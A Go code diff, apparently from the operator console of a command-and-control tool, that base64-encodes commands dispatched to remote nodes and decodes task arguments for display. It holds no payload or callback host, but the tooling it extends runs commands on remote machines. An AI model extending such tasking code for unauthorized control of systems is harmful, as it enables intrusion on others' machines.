@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -184,9 +185,12 @@ func main_loop() {
 				node = split2[1]
 			}
 
+			// Encodes command (this is to help with using "")
+			encoded_command_string := base64.StdEncoding.EncodeToString([]byte(command_string))
+
 			// Checks the node exists. If it does do the thing
 			if check_node(node) != false {
-				handle_run(node, command_string)
+				handle_run(node, encoded_command_string)
 			} else {
 				fmt.Println(color.RedString("ERROR: ") + "Node not found")
 			}
@@ -526,7 +530,20 @@ func display_tasks_by_node(NodeID string) {
 			fmt.Println("######################################")
 			fmt.Println("Task ID:		" + task.TaskID)
 			fmt.Println("Action:			" + task.Action) // No idea why two tabs 🤷
-			fmt.Println("Argument: 		" + task.Content)
+
+			// Handles a base64 encoded string
+			if isBase64(task.Content) == true {
+
+				decoded, err := base64.StdEncoding.DecodeString(task.Content)
+				if err != nil {
+					fmt.Println("Error decoding base64:", err)
+					return
+				}
+				fmt.Println("Argument: 		" + string(decoded))
+			} else {
+				fmt.Println("Argument: 		" + task.Content)
+			}
+
 			fmt.Println("Progress: 		" + task.Progress)
 			fmt.Println("Result: ")
 			fmt.Println("----")
@@ -711,7 +728,20 @@ func get_task_by_id(input string) {
 			fmt.Println("######################################")
 			fmt.Println("Task ID:		" + task.TaskID)
 			fmt.Println("Action:			" + task.Action) // No idea why two tabs 🤷
-			fmt.Println("Argument: 		" + task.Content)
+
+			// Handles a base64 encoded string
+			if isBase64(task.Content) == true {
+
+				decoded, err := base64.StdEncoding.DecodeString(task.Content)
+				if err != nil {
+					fmt.Println("Error decoding base64:", err)
+					return
+				}
+				fmt.Println("Argument: 		" + string(decoded))
+			} else {
+				fmt.Println("Argument: 		" + task.Content)
+			}
+
 			fmt.Println("Progress: 		" + task.Progress)
 			fmt.Println("Result: ")
 			fmt.Println("----")
@@ -810,4 +840,10 @@ func get_payloads_from_server() {
 
 	fmt.Println()
 
+}
+
+// Checks if a string is base64 encoded
+func isBase64(s string) bool {
+	_, err := base64.StdEncoding.DecodeString(s)
+	return err == nil
 }
